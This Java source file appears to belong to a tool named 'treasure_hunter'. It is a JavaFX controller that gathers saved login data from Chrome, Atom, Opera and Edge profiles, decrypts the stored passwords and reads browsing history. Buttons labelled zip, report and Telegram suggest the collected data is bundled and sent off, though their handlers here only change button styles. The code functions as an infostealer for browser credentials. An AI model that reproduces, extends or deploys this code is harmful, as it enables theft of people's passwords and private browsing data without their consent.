package com.treasure_hunter_java;

import com.treasure_hunter_java.browsers.Atom;
import com.treasure_hunter_java.browsers.Chrome;
import com.treasure_hunter_java.browsers.Edge;
import com.treasure_hunter_java.browsers.Opera;
import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.fxml.Initializable;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.stage.Stage;
import jfxtras.styles.jmetro.JMetro;
import jfxtras.styles.jmetro.Style;

import java.io.IOException;
import java.net.URL;
import java.nio.file.Path;
import java.util.HashMap;
import java.util.Objects;
import java.util.ResourceBundle;

public class MainController implements Initializable {

    @FXML
    private Button searchPasswordsButton;

    @FXML
    private CheckBox passwordsGoogle;

    @FXML
    private CheckBox historyGoogle;

    @FXML
    private CheckBox passwordsAtom;

    @FXML
    private CheckBox historyAtom;

    @FXML
    private CheckBox passwordsOpera;

    @FXML
    private CheckBox historyOpera;

    @FXML
    private CheckBox passwordsEdge;

    @FXML
    private CheckBox historyEdge;

    @FXML
    private Button generateDictionaryButton;

    @FXML
    private Button reportButton;

    @FXML
    private Button zipButton;

    @FXML
    private Button telegramButton;

    @FXML
    private Button start;

    public static Stage currentStage;
    private void getGoogleData(CopyFiles copyFiles) throws Exception {

        Chrome chrome = new Chrome();
        chrome.collectProfiles();
        String browserName = "/chrome_data";

        if (passwordsGoogle.isSelected()){
            copyFiles.copyLoginData(chrome.getProfiles(), chrome.getLocalState(), browserName);
            Decrypt.decryptPasswords(Main.mainWorkDirectory + browserName);
        }

        if (historyGoogle.isSelected()){
            System.out.println(Decrypt.getHistory(Main.mainWorkDirectory.toString() + "/chrome_data/history"));
        }
    }

    private void getAtomData(CopyFiles copyFiles) throws Exception {

        Atom atom = new Atom();
        atom.collectProfiles();
        String browserName = "/atom_data";

        if (passwordsAtom.isSelected()) {
            copyFiles.copyLoginData(atom.getProfiles(), atom.getLocalState(), browserName);
            Decrypt.decryptPasswords(Main.mainWorkDirectory + browserName);
        }

        if (historyAtom.isSelected()){
            Decrypt.getHistory(Main.mainWorkDirectory.toString() + "/atom_data/history");
        }
    }

    private void getOperaData(CopyFiles copyFiles) throws Exception {

        Opera opera = new Opera();
        opera.collectProfiles();
        String browserName = "/opera_data";

        if (passwordsOpera.isSelected()) {
            copyFiles.copyLoginData(opera.getProfiles(), opera.getLocalState(), browserName);
            System.out.println(Decrypt.decryptPasswords(Main.mainWorkDirectory + browserName));
        }

        if (historyOpera.isSelected()) {
            Decrypt.getHistory(Main.mainWorkDirectory.toString() + "/opera_data/history");
        }
    }

    private void getEdgeData(CopyFiles copyFiles) throws Exception {

        Edge edge = new Edge();
        edge.collectProfiles();
        String browserName = "/edge_data";

        if (passwordsEdge.isSelected()) {
            copyFiles.copyLoginData(edge.getProfiles(), edge.getLocalState(), browserName);
            Decrypt.decryptPasswords(Main.mainWorkDirectory + browserName);
        }

        if (historyEdge.isSelected()) {
            Decrypt.getHistory(Main.mainWorkDirectory.toString() + "edge_data/history");
        }
    }

    private final String white = "-fx-background-color: #ffffff";

    private final String grey =  "-fx-background-color: #cccccc";

    @FXML
    protected void onSearchPasswordsButtonClick() {

        generateDictionaryButton.setStyle(white);
        reportButton.setStyle(white);
        telegramButton.setStyle(white);
        zipButton.setStyle(white);
        searchPasswordsButton.setStyle(grey);
    }

    @FXML
    protected void onStartButtonClick() throws Exception {

        getGoogleData(new CopyFiles());
        getAtomData(new CopyFiles());
        getOperaData(new CopyFiles());
        getEdgeData(new CopyFiles());

    }

    @FXML
    protected void onGenerateDictionaryButtonClick() throws IOException {
        searchPasswordsButton.setStyle(white);
        reportButton.setStyle(white);
        telegramButton.setStyle(white);
        zipButton.setStyle(white);
        generateDictionaryButton.setStyle(grey);
        currentStage = (Stage) searchPasswordsButton.getScene().getWindow();

        Parent root = FXMLLoader.load(Objects.requireNonNull(getClass().getResource("fxml/DictionaryScene.fxml")));
        JMetro jMetro = new JMetro(root, Style.LIGHT);
        Scene scene = new Scene(root, 750, 500);

        currentStage.setScene(scene);
        currentStage.show();
    }

    @FXML
    protected void onReportButtonClick() throws Exception {
        searchPasswordsButton.setStyle(white);
        generateDictionaryButton.setStyle(white);
        telegramButton.setStyle(white);
        zipButton.setStyle(white);
        reportButton.setStyle(grey);

        //Decrypt decrypt = new Decrypt();
        //System.out.println(Decrypt.getMasterKey());
        //System.out.println(Decrypt.decryptPasswords());
    }

    @FXML
    protected void onZipButtonClick() {
        searchPasswordsButton.setStyle(white);
        reportButton.setStyle(white);
        generateDictionaryButton.setStyle(white);
        telegramButton.setStyle(white);
        zipButton.setStyle(grey);
    }

    @FXML
    protected void onTelegramButtonClick() {
        searchPasswordsButton.setStyle(white);
        reportButton.setStyle(white);
        generateDictionaryButton.setStyle(white);
        zipButton.setStyle(white);
        telegramButton.setStyle(grey);
    }

    @Override
    public void initialize(URL url, ResourceBundle rb) {
        searchPasswordsButton.setStyle(grey);
    }
}